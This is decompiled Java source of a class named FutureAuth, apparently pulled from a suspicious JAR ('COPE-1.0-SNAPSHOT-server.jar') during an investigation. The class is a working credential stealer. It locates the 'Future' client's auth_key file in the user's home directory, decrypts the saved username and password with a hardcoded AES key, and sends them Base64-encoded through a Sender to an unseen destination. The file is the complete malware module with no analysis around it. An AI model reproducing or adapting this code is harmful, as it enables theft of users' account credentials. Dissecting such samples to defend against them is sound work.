/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.FileUtil;
/*    */ import idasido.adldaosd.wpiw.util.Message;
/*    */ import java.io.DataInputStream;
/*    */ import java.io.File;
/*    */ import java.io.IOException;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.nio.file.Files;
/*    */ import java.util.Arrays;
/*    */ import java.util.Base64;
/*    */ import java.util.Optional;
/*    */ import javax.crypto.Cipher;
/*    */ import javax.crypto.spec.IvParameterSpec;
/*    */ import javax.crypto.spec.SecretKeySpec;
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class FutureAuth
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 25 */     String[] auth = getFutureAuth();
/* 26 */     if (auth != null && auth.length == 2) {
/*    */       
/* 28 */       Sender.send((new Message.Builder("Login"))
/* 29 */           .addField("Username (Base64)", Base64.getEncoder().encodeToString(auth[0].getBytes(StandardCharsets.UTF_8)), true)
/* 30 */           .addField("Password (Base64)", Base64.getEncoder().encodeToString(auth[1].getBytes(StandardCharsets.UTF_8)), true)
/* 31 */           .build());
/*    */     } else {
/* 33 */       Sender.send("Failed to get future auth " + Arrays.toString((Object[])auth));
/*    */     } 
/*    */   }
/*    */   
/*    */   private byte[] futureReadFile(DataInputStream dataInputStream) throws IOException {
/* 38 */     byte[] arrby = new byte[dataInputStream.readInt()];
/* 39 */     dataInputStream.read(arrby);
/* 40 */     return arrby;
/*    */   }
/*    */ 
/*    */   
/*    */   private byte[] futureKeyConvert() {
/* 45 */     byte[] array = new byte["428A487E3361EF9C5FC20233485EA236".length() / 2];
/* 46 */     int i = 0;
/*    */     
/* 48 */     for (int n = 0; i < "428A487E3361EF9C5FC20233485EA236".length(); i = n) {
/*    */       
/* 50 */       int n2 = n / 2;
/* 51 */       byte b = (byte)((Character.digit("428A487E3361EF9C5FC20233485EA236".charAt(n), 16) << 4) + Character.digit("428A487E3361EF9C5FC20233485EA236".charAt(n + 1), 16));
/* 52 */       n += 2;
/* 53 */       array[n2] = b;
/*    */     } 
/* 55 */     return array;
/*    */   }
/*    */ 
/*    */   
/*    */   public static byte[] futureDecryptFile(byte[] array, byte[] array2, byte[] array3) throws Exception {
/* 60 */     SecretKeySpec secretKeySpec = new SecretKeySpec(array2, "AES");
/* 61 */     IvParameterSpec ivParameterSpec = new IvParameterSpec(array3);
/* 62 */     Cipher instance = Cipher.getInstance("AES/CBC/PKCS5PADDING");
/* 63 */     instance.init(2, secretKeySpec, ivParameterSpec);
/* 64 */     return instance.doFinal(array);
/*    */   }
/*    */ 
/*    */   
/*    */   private String[] getFutureAuth() {
/* 69 */     Optional<File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\auth_key");
/* 70 */     if (file.isPresent()) {
/*    */       
/*    */       try {
/*    */         
/* 74 */         byte[] key = futureKeyConvert();
/* 75 */         DataInputStream dis = new DataInputStream(Files.newInputStream(((File)file.get()).toPath(), new java.nio.file.OpenOption[0]));
/* 76 */         byte[] arr1 = futureReadFile(dis);
/* 77 */         byte[] username = futureDecryptFile(futureReadFile(dis), key, arr1);
/* 78 */         byte[] password = futureDecryptFile(futureReadFile(dis), key, arr1);
/* 79 */         String user = new String(username, StandardCharsets.UTF_8);
/* 80 */         String pass = new String(password, StandardCharsets.UTF_8);
/* 81 */         return new String[] { user, pass };
/*    */       }
/* 83 */       catch (Exception var8) {
/*    */         
/* 85 */         return new String[] { var8.getMessage(), var8.getMessage() };
/*    */       } 
/*    */     }
/*    */ 
/*    */     
/* 90 */     return new String[] { "File not found", "File not found" };
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\FutureAuth.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */